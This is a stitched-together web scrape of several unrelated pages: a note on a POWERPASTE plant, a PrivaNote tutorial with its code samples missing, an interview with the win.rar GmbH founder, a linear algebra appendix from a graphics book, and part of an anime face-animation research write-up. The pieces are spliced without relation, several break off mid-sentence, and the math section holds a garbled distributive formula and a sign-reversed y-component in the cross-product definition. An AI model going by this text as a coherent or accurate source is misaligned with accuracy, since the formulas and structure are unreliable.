<p>Fraunhofer IFAM is currently building a production plant for POWERPASTE at the Fraunhofer Project Center for Energy Storage and Systems ZESS. Scheduled to go into operation in 2021, this new facility will be able to produce up to four tons of POWERPASTE a year – not only for e-scooters.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>You may have stumbled upon this page after visiting <a href="https://privanote.xyz/" target="_blank" rel="noopener noreferrer">PrivaNote (privanote.xyz)</a>.</p><p>PrivaNote is an offline first, end-to-end encrypted note taking solution. It's one of the first applications built on top of Portabella and serves as a reference for other developers looking to build their own apps.</p><p>PrivaNote is <a href="https://github.com/portabellainc/privanote" target="_blank" rel="noopener noreferrer">open source</a> so please take a look at the source code if anything is unclear. We've also released a <a href="https://chrome.google.com/webstore/detail/privanote-extension/bmpjebghajghighjhanphoekfenjkeao" target="_blank" rel="noopener noreferrer">Chrome extension</a> and a <a href="https://addons.mozilla.org/en-GB/firefox/addon/privanote-extension/" target="_blank" rel="noopener noreferrer">Firefox addon</a> to help you take notes as seamlessly as possible.</p><p>With that said, let's dive into how we built this!</p><h3>Overview<a href="#overview" title="Direct link to heading">#</a></h3><p>PrivaNote is a <a href="https://nextjs.org/" target="_blank" rel="noopener noreferrer">Next.js</a> application with <a href="https://tailwindcss.com/" target="_blank" rel="noopener noreferrer">TailwindCSS</a> to make it look pretty. The editor is a reasonably customised <a href="https://github.com/ianstormtaylor/slate" target="_blank" rel="noopener noreferrer">Slate</a> instance. Setting up these components to play nicely is a breeze thanks to modern tooling.</p><p>Without setting up the encrypted backup PrivaNote will write to your browsers IndexedDB or LocalStorage. After setting up and initialising your Portabella configuration it will read and write from there.</p><h3>Scaffolding out application<a href="#scaffolding-out-application" title="Direct link to heading">#</a></h3><p>Our initialisation script looked a little like this:</p><p>We took a lot of inspiration for our editor from one of the examples the <a href="https://github.com/udecode/slate-plugins" target="_blank" rel="noopener noreferrer">slate-plugins</a> library provides.</p><h3>Reading/writing notes from/to IndexedDB<a href="#readingwriting-notes-fromto-indexeddb" title="Direct link to heading">#</a></h3><p>After scaffolding our application we needed to ensure it's offline first. That means we should be able to use it without an internet connection and without Portabella. For this we leveraged the <a href="https://github.com/localForage/localForage" target="_blank" rel="noopener noreferrer">localForage</a> library. It tries to use IndexedDB and then falls back to LocalStorage if the browser doesn't have it.</p><p>We could have written this layer ourselves but it just made sense to bring in a dependency to make sure we didn't mess anything up.</p><p>To read all of our notes it looks a bit like this:</p><p>Creating a note is as easy as:</p><p>We won't show you the delete operation because, well, you get the gist.</p><h3>Reading/writing notes from/to Portabella<a href="#readingwriting-notes-fromto-portabella" title="Direct link to heading">#</a></h3><p>Setting up our Portabella integration is a little trickier. We have a few additional constraints here, we need to:</p><ul><li>save Portabella config in our local database</li><li>check if they have Portabella config before falling back to the local database storage</li><li>prompt users to setup their Portabella integration (after 10 seconds to not be annoying).</li></ul><p>Let's cover reading and writing data before we get to the administrative tasks. Writing a note to Portabella leveraging the <a href="https://github.com/portabellainc/privanote" target="_blank" rel="noopener noreferrer">@portabella/sdk</a> is as easy as:</p><p>Reading all our notes (when we refresh the page for example looks like):</p><p>The SDK takes care of decrypting everything for us so we don't need to worry about getting data we can't read.</p><h3>Prompting for Portabella credentials<a href="#prompting-for-portabella-credentials" title="Direct link to heading">#</a></h3><p>Before we can do the above operations we need to ensure we actually have Portabella config so we can initialise the SDK and make requests.</p><p>To do this we want to prompt the user to setup their integration after 10 seconds on PrivaNote. Additionally we don't want to prompt them again if they've already said yes (or no).</p><p>Our React <code>useEffect</code> hook looks a bit like this:</p><p>Doing it this way allows for a seamless end user experience.</p><h3>Packaging it as a browser extension<a href="#packaging-it-as-a-browser-extension" title="Direct link to heading">#</a></h3><p>The final piece of the puzzle is packaging up the Next.js application for use as a browser extension. Having to manually open privanote.xyz everytime you want to take notes is a bit cumbersome, so the idea is to override the "new tab" page of your browser. That means pressing CMD (or CTRL) + N will open up PrivaNote, allowing you to jott down thoughts without thinking twice about it.</p><p>Here's our script we used to do this:</p><p>The most interesting lines are the ones that contain <code>_next</code> and <code>next</code>. Chrome won't let browser extensions import JavaScript files that start with an underscore. So trying to add a <code>&lt;script src="/_next/a.js" /&gt;</code> tag won't work out of the box, we need to replace <code>_next</code> with <code>next</code> (or any string you prefer). The <code>sed</code> command shown here works on Mac OS but you might have to fiddle with it if you're using a different OS.</p><h3>Conclusion<a href="#conclusion" title="Direct link to heading">#</a></h3><p>Thanks for taking the time to checkout this tutorial, as we said PrivaNote is one of the first applications built on top of Portabella so we'll continue to improve documentation and APIs as we go and discover what's useful to people.</p><p>If you have any questions feel free to reach on Twitter to us <a href="https://twitter.com/portabellaio" target="_blank" rel="noopener noreferrer">@portabellaio</a> or via email <a href="mailto:hello@portabella.io" target="_blank" rel="noopener noreferrer">hello@portabella.io</a>.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>You founded win.rar GmbH as a student. Who or what encouraged your entrepreneurial spirit?</h3><p>We started win.rar together with my cousin Öncül Kaya during a time both of us were in the first semesters of our studies. For me it was a logical continuation of my career which had began as a coach and manager at a small basketball club in Germany. I had been actively promoting our club and already at the age of 17 I was actively doing all classical work in marketing and PR. After finishing school which is 13 years in Germany plus an extra year in USA and the mandatory military or civil service I did a two year training to become a banker. That makes a total education of 17 years. Following banking I worked part-time in a company that was consulting banks on IT projects and then I moved into a company that was a local internet service provider (ISP) and Software Development company. As Marketing Assistant and later Marketing Manager, one of my tasks there was to create business around WinRAR which the company was distributing in Germany and USA.</p><p>After leaving the company I was approached by Ron Dwight the publisher of WinRAR and asked if we would like to sell WinRAR in Germany.</p><p>I thought that it would be wrong to engage in a business which would be in direct competition to my former employer and so we tried to build an international business around WinRAR aimed at consulting Ron Dwight on how to improve WinRAR, the distribution network and the brand of the product.</p><p>It was intended to generate us a little side income until the end of university.</p><p>We basically had two underlying ideas for starting our own company rather than just acting as employees or contractors:</p><p>A) We wanted to have an official business structure with a GmbH which is German for limited liability company. However the GmbH back then required a minimum capital of 25’000 Euros, so it enjoyed the respect of people since not every entrepreneur is able to put that kind of money into a bank account and is willing to risk it.</p><p>We were able to convince my father to loan the money and agreed internally not to touch the money except for paying the expenses related to registering a company. &nbsp;</p><p>That way we were planning to be able to act as &nbsp;respected entrepreneurs without risking not being able to pay back what we owed my father.</p><p>B) We wanted to prepare a future brand-transfer by putting a well recognized name on our business that everybody would know and which would give us credibility in the future in case we would move away from WinRAR.</p><p>So I asked Ron Dwight if he would allow us to call the company win.rar GmbH. He agreed with a sentence I never forgot:</p><blockquote><p>“Of course you can use the brand for your company. It will make sure you commit yourself 100% to WinRAR because you would not be able to conduct any other business under that company name.”</p></blockquote><p>It was a price we are very willing to pay. We did not have much to lose and we had a feeling that if we did our job well for a couple of years (until we are done with our studies and could commit full-time), we could convince Ron to retire and have us continue the business for him.</p><p>So to sum it up, we were young and went for an opportunity that we believed was going to fund our expenses while going to school and we felt we had an opportunity to create our own work-place when done. The costs and risks seemed very low compared to the outlook it gave us.</p><h3>Was anyone mentoring you at the very beginning of your career?</h3><p>It depends on when you define the beginning of my career. Prior to starting with win.rar I did a two year training program with the Deutsche Bank, where all we did was being monitored and coached. It was an incredible schooling or mentoring experience in all areas of business. Before I was very lucky to have very good teachers when going to school. Especially in Mathematics I was always challenged by a long line of great teachers. The same is true for my language teachers. It was only much later that I realized how valuable the lessons were that I was taught in school. After the training and before starting with WinRAR I was lucky to have Andreas Messer teach me the tricks of the trade in the consulting business. Then during the founding period I was lucky to consider Ron Dwight as a mentor. He was always happy to answer any questions I had. However after he passed away I did not have additional help except from our peers.</p><h3>What was the initial idea of win.rar GmbH? Was it difficult for it to make a success?</h3><p>In addition to the above, the basic instrument to build was a multi-lingual website. Since at that time I more or less spoke five languages, we built a simple site in English, German, Turkish, French and Spanish. I had managed to buy <a href="http://www.win-rar.com/">www.win-rar.com</a> for approximately 500 Euros from a domain-grabber and with the contract that allowed us to sell WinRAR we had put together five &nbsp;puzzle pieces:</p><ol><li>Distribution rights to a Product</li><li>A website containing the product name</li><li>A company name containing the product name</li><li>A website with an international appearance &nbsp;around the product</li><li>The necessary infrastructure (registered company and bank account) to be able to conduct business</li></ol><p>I would love to say that it was very difficult, but we were surprised by how easy it was. A couple of days after we had put the website online, we already received a fax with the first order. &nbsp;The next day the second fax came in. It felt like we had struck a mine on the first try, but what followed was more than anything we had imagined.</p><h3>What was going on with your job after Ron Dwight passed away?</h3><p>Things happened extremely fast around Easter in 2002. This is just weeks after starting the company on 20.02.2002. Ron passed away hours after explaining to me how we need to operate his platform in order to create license keys for the first two orders we had received. So basically we had only successfully created a single user license and one multi-user license when our entire business structure faced potentially becoming obsolete.</p><p>We had no idea who would follow Ron. We had no idea if that person or organisation would respect the agreements we had made with Ron, some of which had been verbal. We had no idea how we would be able to provide the product to our customers if his platform should stop working. So basically I was not only very sad about having lost a respected business partner and mentor but I was also afraid that everything we had built could become obsolete.</p><p>So we made a decision to deviate from our plan to not touch any of the money and instead use whatever we need to fly to the funeral, talk to the family and find out if there is any opportunity to continue our business. We had a head-start over anybody else including the developers around WinRAR because -as I only found out later- I was the person most involved with Ron. In order to set up everything I had pretty much been calling him on a weekly basis for months and when he passed away, his girlfriend did not know who else to call but me, so it was up to me to inform Ron’s business partners about his death.</p><p>So after booking the flight I asked some former colleagues for an emergency meeting and we mapped out a concept based on the limited knowledge we had. We agreed that they would try to develop a system to handle orders while I talk to the family and we would offer them to continue the business.</p><p>However the family was not interested in getting involved. We were able to make a deal with the creditors, with the distributors and developers and Ron’s family which made everybody happy but meant a load of work for us since it meant us being the future exclusive publisher of WinRAR taking over a business which we had only very limited knowledge of.</p><p>I quickly realized that I could not go on with school, but the healthy business we had been able to quickly create from almost nothing in just a few weeks allowed us to pay back my father and was so much more interesting than school that it was fun to spend around 100 hours per week on building win.rar to what it is now.</p><h3>Does WinRAR make life easier?</h3><p>I absolutely believe so. It was one of the reasons we got involved with it. We feel that it is a useful tool for people who either have limited bandwidth or limited storage. While today such restrictions are no longer the main reason for use of WinRAR, we still offer the most convenient way of sharing files and folders and enhance that service with safe encryption, repair functions and other features that allow ease of use when it comes to archiving your data.</p><p>Surely there are thousands of ways today to handle data, but if you are concerned about privacy and reliability, we feel confident to say that there is still no better way than using WinRAR to maintain your own data on your own system.</p><h3>There are a lot of jokes online about the WinRAR never ending trial period. What is your favorite joke about WinRAR? Do you have your own?</h3><p>Actually there are so many, it is hard to only chose one. Here is a selection:</p><p><img loading="lazy" src="https://i2.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrar-meme-1024x646.jpg?resize=640%2C403" alt="winrar-meme" width="640" height="403" data-recalc-dims="1"></p><p><img loading="lazy" src="https://i1.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrarmeme.jpg?resize=640%2C967" alt="winrarmeme" width="640" height="967" srcset="https://i1.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrarmeme.jpg?w=650&amp;ssl=1 650w, https://i1.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrarmeme.jpg?resize=66%2C100&amp;ssl=1 66w, https://i1.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrarmeme.jpg?resize=132%2C200&amp;ssl=1 132w, https://i1.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrarmeme.jpg?resize=106%2C160&amp;ssl=1 106w, https://i1.wp.com/en.split-techcity.com/wp-content/uploads/sites/2/2017/02/winrarmeme.jpg?resize=212%2C320&amp;ssl=1 212w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1"></p><p><iframe src="https://www.youtube.com/embed/lX_pF03vCSU" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p><p>Our own jokes do not come close to these I think. But we would like to ask the community of crackers:</p><blockquote><p>“Why do you bother creating a cracked version of WinRAR? The trial period never ends…thank you very much for the free marketing you gave us. We will be forever grateful!”</p></blockquote><h3>There are only five people in your company. How did that make life different for you? Would you ever scale up?</h3><p>That is a tough one to answer. It will surely depend on the project. Having only few people around you has a lot of advantages. The biggest maybe is having to constantly prioritize and focus on the immediate needs. It keeps the management and the company very centered. Any new project may require more man-power and there is no reason to not scale up when the business/project appears to be very profitable. But we believe that just employing people for the sake of growing is not the way. We like to see it the other way. Do things manually first but then immediately decide if it is possible to cut repetitions and program to make things easier. If it makes money and there …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>This appendix serves as a cheat sheet for linear algebra. The subject is presented as a set of tools, their properties, and what you can use them for. If you’re interested in the theory behind all this, you can pick up any introductory linear algebra textbook.</p>
<p>The focus is exclusively 2D and 3D algebra, as that’s what’s required in this book.</p>
<h2 id="points"><a href="#points">Points</a></h2>
<p>A <em>point</em> represents a position within a coordinate system.</p>
<p>We represent a point as a sequence of numbers between parentheses—for example, <span>\((4, 3)\)</span>. We refer to points using capital letters, such as <span>\(P\)</span> or <span>\(Q\)</span>.</p>
<p>Each of the numbers in the point’s sequence is called a <em>coordinate</em>. The number of coordinates is the point’s <em>dimension</em>. A point with two coordinates is called a two-dimensional, or 2D, point.</p>
<p>The order of the numbers is important; <span>\((4, 3)\)</span> is not the same as <span>\((3, 4)\)</span>. By convention, the coordinates are called <span>\(x\)</span> and <span>\(y\)</span> in 2D, and <span>\(x\)</span>, <span>\(y\)</span>, and <span>\(z\)</span> in 3D; so the point <span>\((4, 3)\)</span> has an <span>\(x\)</span> coordinate of <span>\(4\)</span>, and a <span>\(y\)</span> coordinate of <span>\(3\)</span>. Figure&nbsp;A-1 shows <span>\(P\)</span>, a 2D point with coordinates <span>\((4, 3)\)</span>.</p>
<figure>
<img alt="Figure A-1: The 2D point P has coordinates (4, 3)." src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-points.png"><figcaption>Figure A-1: The 2D point <em>P</em> has coordinates (4, 3).</figcaption>
</figure>
<p>We can also refer to specific coordinates of a point using a subscript, like <span>\(P_x\)</span> or <span>\(Q_y\)</span>. So the point <span>\(P\)</span> can also be written as <span>\((P_x, P_y, P_z)\)</span> when convenient.</p>
<h2 id="vectors"><a href="#vectors">Vectors</a></h2>
<p>A <em>vector</em> represents the difference between two points. Intuitively, imagine a vector as an arrow that connects a point to another point; alternatively, think of it as the instructions to get from one point to another.</p>
<h3 id="representing-vectors"><a href="#representing-vectors">Representing Vectors</a></h3>
<p>We represent a vector as a set of numbers between parentheses, and refer to them using a capital letter. This is the same representation we use for points, so we add a small arrow on top to remember they’re vectors and not points. For example, <span>\((2, 1)\)</span> is a vector, which we might decide to call <span>\(\vec{A}\)</span>. Figure&nbsp;A-2 shows two equal vectors, <span>\(\vec{A}\)</span> and <span>\(\vec{B}\)</span>.</p>
<figure>
<img alt="Figure A-2: The vectors \vec{A} and \vec{B} are equal. Vectors don’t have a position." src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-vectors.png"><figcaption>Figure A-2: The vectors <span>\(\vec{A}\)</span> and <span>\(\vec{B}\)</span> are equal. Vectors don’t have a position.</figcaption>
</figure>
<p>Despite sharing their representation with points, vectors don’t represent or have a position; they are, after all, the <em>difference</em> between two positions. When you have a diagram like Figure&nbsp;A-2, you have to draw vectors somewhere; but the vectors <span>\(\vec{A}\)</span> and <span>\(\vec{B}\)</span> are equal, because they represent the same displacement.</p>
<p>In addition, the point <span>\((2, 1)\)</span> and the vector <span>\((2, 1)\)</span> are unrelated. Sure, the vector <span>\((2, 1)\)</span> goes from <span>\((0, 0)\)</span> to <span>\((2, 1)\)</span>, but it’s equally true that it goes from, say, <span>\((5, 5)\)</span> to <span>\((7, 6)\)</span>.</p>
<p>Vectors are characterized by their <em>direction</em> (the angle in which they point) and their <em>magnitude</em> (how long they are).</p>
<p>The direction can be further decomposed into <em>orientation</em> (the slope of the line they’re on) and <em>sense</em> (which of the possible two ways along that line they point). For example, a vector pointing right and a vector pointing left both have the same horizontal orientation, but they have the opposite sense. However, we rarely make this distinction throughout the book.</p>
<h3 id="vector-magnitude"><a href="#vector-magnitude">Vector Magnitude</a></h3>
<p>You can compute the magnitude of a vector from its coordinates. The magnitude is also called the <em>length</em> or <em>norm</em> of the vector. It’s denoted by putting the vector between vertical pipes, as in <span>\(|\vec{V}|\)</span>, and it’s computed as follows:</p>
<p><span>\[|\vec{V}| = \sqrt{{V_x}^2 + {V_y}^2 + {V_z}^2}\]</span></p>
<p>A vector with a magnitude equal to <span>\(1.0\)</span> is called a <em>unit vector</em>.</p>
<h2 id="point-and-vector-operations"><a href="#point-and-vector-operations">Point and Vector Operations</a></h2>
<p>Now that we’ve defined points and vectors, let’s explore what we can do with them.</p>
<h3 id="subtracting-points"><a href="#subtracting-points">Subtracting Points</a></h3>
<p>A vector is the difference between two points. In other words, you can subtract two points and get a vector:</p>
<p><span>\[\vec{V} = P - Q\]</span></p>
<p>In this case you can think of <span>\(\vec{V}\)</span> as “going” from <span>\(Q\)</span> to <span>\(P\)</span>, as in Figure&nbsp;A-3.</p>
<figure>
<img alt="Figure A-3: The vector \vec{V} is the difference between P and Q." src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-point-diff.png"><figcaption>Figure A-3: The vector <span>\(\vec{V}\)</span> is the difference between <em>P</em> and <em>Q</em>.</figcaption>
</figure>
<p>Algebraically, you subtract each of the coordinates separately:</p>
<p><span>\[(V_x, V_y, V_z) = (P_x, P_y, P_z) - (Q_x, Q_y, Q_z) = (P_x - Q_x, P_y - Q_y, P_z - Q_z)\]</span></p>
<h3 id="adding-a-point-and-a-vector"><a href="#adding-a-point-and-a-vector">Adding a Point and a Vector</a></h3>
<p>We can rewrite the equation above coordinate by coordinate:</p>
<p><span>\[V_x = P_x - Q_x\]</span> <span>\[V_y = P_y - Q_y\]</span> <span>\[V_z = P_z - Q_z\]</span></p>
<p>These are just numbers, so all the usual rules apply. This means you can do this:</p>
<p><span>\[Q_x + V_x = P_x\]</span> <span>\[Q_y + V_y = P_y\]</span> <span>\[Q_z + V_z = P_z\]</span></p>
<p>And grouping the coordinates again,</p>
<p><span>\[Q + \vec{V} = P\]</span></p>
<p>In other words, you can add a vector to a point and get a new point. This makes intuitive and geometric sense; given a starting position (a point) and a displacement (a vector), you end up in a new position (another point). Figure&nbsp;A-4 presents an example.</p>
<figure>
<img alt="Figure A-4: Adding \vec{V} to Q gives us P." src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-point-plus-vector.png"><figcaption>Figure A-4: Adding <span>\(\vec{V}\)</span> to <em>Q</em> gives us <em>P</em>.</figcaption>
</figure>
<h3 id="adding-vectors"><a href="#adding-vectors">Adding Vectors</a></h3>
<p>You can add two vectors. Geometrically, imagine putting one vector “after” another, as in Figure&nbsp;A-5.</p>
<figure>
<img alt="Figure A-5: Adding two vectors. Addition is commutative. Remember, vectors don’t have a position." src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-vector-plus-vector.png"><figcaption>Figure A-5: Adding two vectors. Addition is commutative. Remember, vectors don’t have a position.</figcaption>
</figure>
<p>As you can see, vector addition is commutative—that is, the order of the operands doesn’t matter. In the diagram, <span>\(\vec{V} + \vec{W} = \vec{W} + \vec{V}\)</span>.</p>
<p>Algebraically, you add the coordinates individually:</p>
<p><span>\[\vec{V} + \vec{W} = (V_x, V_y, V_z) + (W_x, W_y, W_z) = (V_x + W_x, V_y + W_y, V_z + W_z)\]</span></p>
<h3 id="multiplying-a-vector-by-a-number"><a href="#multiplying-a-vector-by-a-number">Multiplying a Vector by a Number</a></h3>
<p>You can multiply a vector by a number. This is called the <em>scalar product</em>. This makes the vector shorter or longer, as you can see in Figure&nbsp;A-6.</p>
<figure>
<img alt="Figure A-6: Multiplying a vector by a number" src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-vector-scaling.png"><figcaption>Figure A-6: Multiplying a vector by a number</figcaption>
</figure>
<p>If the number is negative, the vector will point the other way; this means it changes its sense, and therefore its direction. But multiplying a vector by a number never changes its orientation—that is, it will remain along the same line.</p>
<p>Algebraically, you multiply the coordinates individually:</p>
<p><span>\[k \cdot \vec{V} = k \cdot (V_x, V_y, V_z) = (k \cdot V_x, k \cdot V_y, k \cdot V_z)\]</span></p>
<p>You can also divide a vector by a number. Just like with numbers, dividing by <span>\(k\)</span> is equivalent to multiplying by <span>\(\frac{1}{k}\)</span>. As usual, division by zero doesn’t work.</p>
<p>One of the applications of vector multiplication and division is to <em>normalize</em> a vector—that is, to turn it into a unit vector. This changes the magnitude of the vector to <span>\(1.0\)</span>, but doesn’t change its other properties. To do this, we just need to divide the vector by its length:</p>
<p><span>\[\vec{V_{normalized}} = \frac{\vec{V}}{|\vec{V}|}\]</span></p>
<h3 id="multiplying-vectors"><a href="#multiplying-vectors">Multiplying Vectors</a></h3>
<p>You can multiply a vector by another vector. Interestingly, there are many ways in which you can define an operation like this. We’re going to focus on two kinds of multiplication that are useful to us: the dot product and the cross product.</p>
<h4 id="dot-product"><a href="#dot-product">Dot Product</a></h4>
<p>The <em>dot product</em> between two vectors (also called the <em>inner product</em>) gives you a number. It’s expressed using the dot operator, as in <span>\(\vec{V} \cdot \vec{W}\)</span>. It’s also written between angle braces, as in <span>\(\langle \vec{V}, \vec{W} \rangle\)</span>.</p>
<p>Algebraically, you multiply the coordinates individually and add them up:</p>
<p><span>\[\langle \vec{V}, \vec{W} \rangle = \langle(V_x, V_y, V_z), (W_x, W_y, W_z)\rangle = V_x \cdot W_x + V_y \cdot W_y + V_z \cdot W_z\]</span></p>
<p>Geometrically, the dot product of <span>\(\vec{V}\)</span> and <span>\(\vec{W}\)</span> is related to their lengths, and to the angle <span>\(\alpha\)</span> between them. The exact formula neatly ties together linear algebra and trigonometry:</p>
<p><span>\[\langle \vec{V}, \vec{W} \rangle = |\vec{V}| \cdot |\vec{W}| \cdot cos(\alpha)\]</span></p>
<p>Either of these formulas help us see that the dot product is commutative (that is, <span>\(\langle \vec{V}, \vec{W} \rangle\)</span> = <span>\(\langle \vec{W}, \vec{V} \rangle\)</span>), and that it’s distributive with respect to a scalar product (that is, $k ,  = k ,  $).</p>
<p>An interesting consequence of the second formula is that if <span>\(\vec{V}\)</span> and <span>\(\vec{W}\)</span> are perpendicular, then <span>\(cos(\alpha) = 0\)</span>, and therefore <span>\(\langle \vec{V}, \vec{W} \rangle\)</span> is also zero. If <span>\(\vec{V}\)</span> and <span>\(\vec{W}\)</span> are unit vectors, then <span>\(\langle \vec{V}, \vec{W} \rangle\)</span> is always between <span>\(-1.0\)</span> and <span>\(1.0\)</span>, with <span>\(1.0\)</span> meaning they’re equal and <span>\(-1.0\)</span> meaning they’re opposite.</p>
<p>The second formula also suggests the dot product can be used to calculate the angle between two vectors:</p>
<p><span>\[\alpha = cos^{-1} \left( \frac{\langle \vec{V}, \vec{W} \rangle}{|\vec{V}| \cdot |\vec{W}|} \right)\]</span></p>
<p>Note that the dot product of a vector with itself, <span>\(\langle \vec{V}, \vec{V} \rangle\)</span>, reduces to the square of its length:</p>
<p><span>\[\langle \vec{V}, \vec{V} \rangle = {V_x}^2 + {V_y}^2 + {V_z}^2 = {|\vec{V}|}^2\]</span></p>
<p>This suggests another way to compute the length of a vector, as the square root of its dot product with itself:</p>
<p><span>\[|\vec{V}| = \sqrt{\langle \vec{V}, \vec{V} \rangle}\]</span></p>
<h4 id="cross-product"><a href="#cross-product">Cross Product</a></h4>
<p>The cross product between two vectors gives you another vector. It’s expressed using the cross operator, as in <span>\(\vec{V} \times \vec{W}\)</span>.</p>
<p>The cross product of two vectors is a vector perpendicular to both of them. In this book we only use the cross product on 3D vectors, shown in Figure&nbsp;A-7.</p>
<figure>
<img alt="Figure A-7: The cross product of two vectors is a vector perpendicular to both of them." src="https://gabrielgambetta.com/computer-graphics-from-scratch/images/aa-vector-cross-product.png"><figcaption>Figure A-7: The cross product of two vectors is a vector perpendicular to both of them.</figcaption>
</figure>
<p>The computation is a bit more involved than the dot product. If <span>\(\vec{R} = \vec{V} \times \vec{W}\)</span>, then</p>
<p><span>\[R_x = V_y \cdot W_z - V_z \cdot W_y\]</span> <span>\[R_y = V_x \cdot W_z - V_z \cdot W_x\]</span> <span>\[R_z = V_x \cdot W_y - V_y \cdot W_x\]</span></p>
<p>The cross product is not commutative. Specifically, <span>\(\vec{V} \times \vec{W} = -(\vec{W} \times \vec{V})\)</span>.</p>
<p>We use the cross product to compute the <em>normal vector</em> of a surface—that is, a unit vector perpendicular to the surface. To do this, we take two vectors on the surface, calculate their cross product, and normalize the result.</p>
<h2 id="matrices"><a href="#matrices">Matrices</a></h2>
<p>A <em>matrix</em> is a rectangular array of numbers. For the purposes of this book, matrices represent <em>transformations</em> that can be applied to points or vectors, and we refer to them with a capital letter, such as <span>\(M\)</span>. This is the same way we refer to points, but it will be clear by the context whether we’re talking about a matrix or a point.</p>
<p>A matrix is characterized by its size in terms of rows and columns. For example, this is a <span>\(4 \times 3\)</span> matrix:</p></div></div>

		<p><b>Abstract.</b> I extended the <a href="https://pkhungurn.github.io/talking-head-anime/">animation-from-a-single-image neural network system I created in 2019</a> so that the characters can make more types of facial expressions. While the old system can only open/close the eyes and the mouth, this new version affords more eye/mouth shapes and can control the eyebrows and the irises. They allow a character to show various emotions and give more convincing impression of speech.</p>

		<h2>1 &nbsp; Motivation</h2>		

		<p>With the goal of making it easier to become a <a href="https://en.wikipedia.org/wiki/Virtual_YouTuber">virtual YouTuber</a> (VTuber), in 2019, I created a <a href="https://pkhungurn.github.io/talking-head-anime">neural network system</a> that can animate the face of any existing anime character, given only an image of it. The system, however, cannot yet be considered practical for becoming a VTuber. The most important shortcoming is that it can only close the eyes and mouth, robbing the character the ability to make most facial expressions. Characters used by professional VTubers, on the other hand, can deform the eyebrows, eyelids, irises, and mouth into various shapes. My goal in this article is to improve my system's expressiveness by increasing the types of movements it can produce.</p>

		<h2>2 &nbsp; Summary of Approach</h2>

		<p>My neural network system takes two inputs. First is a <a href="https://en.wikipedia.org/wiki/Head_shot">head shot</a> of a character looking straight at the viewer, and second is a six-dimensional <i>pose vector</i> that specifies the pose the user wants the character to take. It outputs another image of the same character taking the specified pose. By varying the pose vector over time, the character can be animated. It can perform six types of movements because the pose vector is six-dimensional. However, excluding rotating the face, it can only closes its eyes and mouth.</p>

		<p>The system poses a given character in two steps, each carried out by its own separate subnetwork. The <i>face morpher</i> closes the eyes and the mouth, and the <i>face rotator</i> rotates the face.</p>

		<table>

	                    <b>Figure 2.1</b>

	                </td>
	            </tr>
	        </tbody></table>
	    

	    <p>To increase types of movement, I started by preparing larger datasets. From the <a href="https://pkhungun.github.io/talking-head-anime/index.html#dataset">collection of approximately 8,000 3D models</a> I collected for my last system, I identified 39 common movements of facial parts and generated new datasets containing them. (You can see the list of movements <a href="https://pkhungurn.github.io/talking-head-anime-2/full.html#face-params">here</a>.) The movements encompass all the four movable facial features (eyebrows, eyelids, irises, and mouth) that can be observed in industrial characters. The size of the pose vector increased from 6 to 42 as a result <a href="#fn_pose_vector_length">[footnote]</a>.</p>

	    

	    <p>To deal with larger pose vectors, I propose a new architecture for the face morpher network, the overview of which is depicted in Figure 2.2.</p>

		<table>

	            </tr>
	        </tbody></table>
	    

	    <p>The new face morpher has two subnetworks: the <b>eyebrow morpher</b> and the <b>eye &amp; mouth morpher</b>, with each network deforming the organ(s) in its name. The pose vector is divided into parts that can be fed into the relevant subnetworks.</p>

	    <h3>2.1 &nbsp; Eyebrow Morpher</h3>

	    <p>The eyebrow morpher first segments out the eyebrows with a dedicated subnetwork called the <b>eyebrow segmenter</b>. It then uses another subnetwork called the <b>eyebrow warper</b> to deform eyebrow and then composite the result back to the original image.</p>

	    <table>
	            <tbody><tr>
	                <td>

	            </tr>
	        </tbody></table>
	    

	    <p>The two networks have similar structures. It contains an encoder-decoder network that turns the input image(s) and the (optional) pose vector into an intermediate feature representation, which is then used to perform several image manipulation steps. I employ three types of image manipulation, each encapsulated into a reusable neural network unit.

	    </p><ol>
	    	<li><b>Partial image change</b>. The feature tensor is used to produce an alpha mask and another image that represents changes to the original image. The mask and the change image are then used to perform <a href="https://en.wikipedia.org/wiki/Alpha_compositing">alpha blending</a> with the input image to partially modify it. I take this step from the ECCV 2018 paper by Pumarola et al., which successfully applies it to alter facial expressions in human photos <a href="#fn_pumarola_2018">[2018]</a>.</li>

	    	<li><b>Combining</b>. The feature tensor is used to produce an alpha mask, which is then used to combine two images through alpha blending.</li>

	    	<li><b>Warping.</b> The feature tensor is transformed into an <b>appearance flow</b>, a map which tells, for each pixel of the output, which input image pixel to copy from <a href="#fn_zhou_2016">[Zhou et al. 2016]</a>. The appearance flow is then used to warp another image as it tells where each pixel should be moved to.</li>
	    </ol>
	    
	    

	   	<p>The eyebrow segmenter does its job with two partial image changes. The eyebrow warper deforms the extracted eyebrows with a warp and a partial image change. It then combines them back to the face image. Their architectures are given in Figure 2.4 and 2.5.</p>

	   	<p>

			<b>Figure 2.5</b> Architecture of the eyebrow warper.
		</p>

		<p>During research, I discovered that it was very important to process the eyebrows separately from other facial features. Network architectures that used the same network to morph all facial features blurred the eyebrows after morphing them. By having separate networks morph the eyebrows after segmenting them out, I introduced a strong bias to preserve the eyebrow pixels, yielding crisp results.</p>

		
		<p><b>Figure 2.6</b> The effect of using separate networks to segment, morph, and then composite the eyebrows as proposed above.
		</p>
	
		

		<h3>2.2 &nbsp; Eye &amp; Mouth Morpher</h3>

	    <p>The eye &amp; mouth morpher has a similar architecture to the previous two networks. After passing the input image (the output of the eyebrow morpher) and the relevant part of the pose vector to an encoder-decoder network, it performs the following image manipulation steps:
		</p><ol>
			<li>a warp to deform the mouth and the irises,</li>
